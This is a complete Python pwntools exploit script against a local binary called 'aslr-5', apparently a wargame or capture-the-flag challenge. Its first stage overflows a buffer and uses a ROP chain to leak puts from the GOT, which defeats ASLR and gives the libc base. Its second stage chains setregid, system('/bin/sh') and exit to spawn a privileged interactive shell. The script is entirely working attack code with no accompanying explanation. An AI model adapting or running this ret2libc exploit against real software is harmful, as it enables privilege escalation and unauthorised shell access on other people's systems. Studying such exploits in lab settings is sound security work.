#!/usr/bin/env python

from pwn import *

offset = 140

# addresses
puts_plt = 0x8048360
puts_got = 0x804a014
entry_point = 0x080483a0

# Offsets
offset_puts = 0x00067b40
offset_system = 0x0003d200
offset_setreg = 0x000f0e30
offset_str_bin_sh = 0x17e0cf
offset_exit = 0x000303d0

# gadget
pop_pop_ret = 0x0804861a

# vars
getegid = 1055

# context.log_level = "debug"

def main():
    p = process('./aslr-5')

    # stage 1
    padding = 'A' * offset
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = padding + ropchain

    p.clean()
    p.sendline(payload)

    p.recvuntil('!\n')

    leak = p.recv(4)
    leak = u32(leak)
    log.info('puts at: 0x%x' % leak)

    p.clean()

    # Calc libc base
    libc_base = leak - offset_puts
    log.info("libc_base at: 0x%x" % libc_base)

    # stage 2

    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_str_bin_sh
    exit_addr = libc_base  + offset_exit
    setreg_addr = libc_base + offset_setreg

    log.info("system at: 0x%x" % system_addr)
    log.info("binsh at: 0x%x" % binsh_addr)
    log.info("exit at: 0x%x" % exit_addr)

    # Build payload #2
    padding2 = 'A' * offset

    ropchain2 =  p32(setreg_addr)
    ropchain2 += p32(pop_pop_ret)
    ropchain2 += p32(getegid) * 2
    ropchain2 += p32(system_addr)
    ropchain2 += p32(exit_addr)
    ropchain2 += p32(binsh_addr)

    payload2 = padding2 + ropchain2
    p.sendline(payload2)

    log.success("Here comes the shell!")

    p.clean()
    p.interactive()

if __name__ == '__main__':
    main()
